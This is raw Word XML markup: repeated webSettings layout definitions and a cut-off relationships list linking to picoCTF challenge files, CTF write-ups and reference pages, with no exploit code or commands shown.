              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1049232145">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1003974462">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1217819645">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1231965704">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="560167876">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="900679551">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1608612650">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="600186900">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="716515092">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="785346392">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="531849413">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="277294731">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="551894009">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1197233990">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="719673287">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="369647285">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1950121595">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1938902952">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="19148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65">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1486125841">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="661785022">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="464202495">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1812476865">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="934289633">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="246810470">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1259293856">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1896617613">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="834422107">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="499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427279">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1085419656">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="2055425518">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="137189528">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1784228193">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1319655784">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="15002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158">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1430158422">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>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sChild>
        </w:div>
        <w:div w:id="1658730630">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="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
          </w:divsChild>
        </w:div>
        <w:div w:id="1142425330">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="3329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31">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1297026672">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="380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7444">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2119720227">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1009985875">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1460299648">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1587837672">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1899003758">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="589312777">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="12992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6179">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1656758643">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1278561184">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1065566934">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="962658756">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1720979337">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="8142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artifacts.picoctf.net/c/67/fixme2.py" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:63909/" TargetMode="External"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/FlyN-Nick/picoGymWriteups/blob/main/Web%20Exploitation/Where%20are%20the%20robots/Where%20are%20the%20robots.md" TargetMode="External"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6" TargetMode="External"/><Relationship Id="rId191" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image85.png"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.py" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.png"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:25395/robots.txt" TargetMode="External"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image65.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.hucerc.com/recommended-tool-list-for-ctf/" TargetMode="External"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Accept-Language" TargetMode="External"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:51108/robots.txt" TargetMode="External"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image82.png"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/51/level1.py" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Two's_complement" TargetMode="External"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/41511/" TargetMode="External"/><Relationship Id="rId118" 